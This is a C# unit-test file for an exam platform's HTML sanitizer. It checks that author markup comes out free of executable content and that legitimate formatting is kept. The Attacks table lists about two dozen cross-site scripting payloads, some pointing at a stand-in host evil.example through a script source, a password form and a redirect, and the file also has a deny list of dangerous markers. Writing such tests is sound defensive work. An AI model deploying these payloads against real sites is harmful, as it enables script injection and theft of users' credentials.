using ExamPlatform.Modules.QuestionBank.Infrastructure;

namespace ExamPlatform.Modules.QuestionBank.UnitTests;

/// <summary>
/// The sanitizer is the only thing between an author's markup and every candidate's browser, so these tests are a table
/// of known script-injection tricks that must all come out harmless, plus proof that real formatting survives.
/// </summary>
public class RichTextSanitizerTests
{
    private readonly RichTextSanitizer sanitizer = new();

    /// <summary>Anything in the output that a browser could act on.</summary>
    private static readonly string[] Dangerous =
    [
        "<script", "onerror", "onload", "onclick", "onmouseover", "javascript:", "vbscript:", "<iframe", "<svg", "<style", "<img",
        "<object", "<embed", "<form", "<input", "<meta", "<base", "<link", "<a ", "href=", "style=", "srcdoc", "data:",
    ];

    public static TheoryData<string> Attacks => new()
    {
        "<script>alert(1)</script>",
        "<SCRIPT SRC=https://evil.example/x.js></SCRIPT>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x onerror=alert(1)>",
        "<img src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
        "<a href=\"javascript:alert(1)\">click</a>",
        "<a href=\" jav&#x09;ascript:alert(1)\">click</a>",
        "<p onclick=\"alert(1)\">text</p>",
        "<p style=\"background:url(javascript:alert(1))\">text</p>",
        "<svg onload=alert(1)>",
        "<svg><script>alert(1)</script></svg>",
        "<iframe src=\"https://evil.example\"></iframe>",
        "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",
        "<style>body{display:none}</style>",
        "<object data=\"https://evil.example/x.swf\"></object>",
        "<embed src=\"https://evil.example/x.swf\">",
        "<form action=\"https://evil.example\"><input name=password></form>",
        "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">",
        "<base href=\"https://evil.example/\">",
        "<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">",
        "<math><mtext></p><script>alert(1)</script></mtext></math>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<details open ontoggle=alert(1)>x</details>",
    };

    [Theory]
    [MemberData(nameof(Attacks))]
    public void Sanitize_RemovesWhatABrowserCouldExecute(string attack)
    {
        var result = sanitizer.Sanitize(attack);

        foreach (var marker in Dangerous)
        {
            Assert.DoesNotContain(marker, result.Html, StringComparison.OrdinalIgnoreCase);
        }
    }

    [Fact]
    public void Sanitize_KeepsFormattingAQuestionNeeds()
    {
        var result = sanitizer.Sanitize(
            "<p>Water is H<sub>2</sub>O and x<sup>2</sup> is <strong>big</strong>, <em>really</em>, <u>very</u>.</p>" +
            "<ul><li>one</li><li>two</li></ul><ol><li>first</li></ol><blockquote>quote</blockquote><pre><code>x = 1</code></pre>");

        Assert.Contains("H<sub>2</sub>O", result.Html);
        Assert.Contains("x<sup>2</sup>", result.Html);
        Assert.Contains("<strong>big</strong>", result.Html);
        Assert.Contains("<em>really</em>", result.Html);
        Assert.Contains("<u>very</u>", result.Html);
        Assert.Contains("<ul><li>one</li><li>two</li></ul>", result.Html);
        Assert.Contains("<ol><li>first</li></ol>", result.Html);
        Assert.Contains("<blockquote>quote</blockquote>", result.Html);
        Assert.Contains("<pre><code>x = 1</code></pre>", result.Html);
    }

    [Fact]
    public void Sanitize_DropsEveryAttributeFromAnAllowedTag() =>
        Assert.Equal("<p>hi</p>", sanitizer.Sanitize("<p class=\"x\" id=\"y\" style=\"color:red\" data-a=\"1\" title=\"t\">hi</p>").Html);

    [Fact]
    public void Sanitize_KeepsTheTextOfATagItDoesNotAllow()
    {
        var result = sanitizer.Sanitize("<div>hello <span>world</span></div>");

        Assert.Equal("hello world", result.PlainText);
        Assert.DoesNotContain("<div", result.Html);
        Assert.DoesNotContain("<span", result.Html);
    }

    [Fact]
    public void Sanitize_KeepsLiteralAngleBracketsAsText()
    {
        var result = sanitizer.Sanitize("<p>if a &lt; b &amp;&amp; b &gt; c</p>");

        Assert.Equal("if a < b && b > c", result.PlainText);
        Assert.Contains("&lt;", result.Html);
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData("<p></p>")]
    [InlineData("<p><br></p>")]
    [InlineData("<p>   </p>")]
    [InlineData("<script>alert(1)</script>")]
    public void Sanitize_OfNothingVisible_HasNoContent(string? html) =>
        Assert.False(sanitizer.Sanitize(html).HasContent);

    [Fact]
    public void Sanitize_OfPlainText_HasContentAndReportsItsText()
    {
        var result = sanitizer.Sanitize("What is 2 + 2?");

        Assert.True(result.HasContent);
        Assert.Equal("What is 2 + 2?", result.PlainText);
        Assert.Equal(0, result.ImageCount);
    }
}
